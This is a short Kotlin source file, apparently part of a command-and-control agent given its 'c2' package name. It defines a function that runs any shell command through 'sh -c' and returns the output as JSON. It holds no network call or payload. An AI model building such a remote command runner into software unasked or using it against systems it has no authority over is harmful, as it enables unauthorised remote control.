package com.outcome.c2

import org.json.JSONObject

object Shell {
    fun exec(cmd: String): JSONObject {
        return try {
            val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val out = proc.inputStream.bufferedReader().readText()
            val err = proc.errorStream.bufferedReader().readText()
            val code = proc.waitFor()
            JSONObject()
                .put("exit", code)
                .put("stdout", out.take(512 * 1024))
                .put("stderr", err.take(512 * 1024))
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "exec_failed")
        }
    }
}
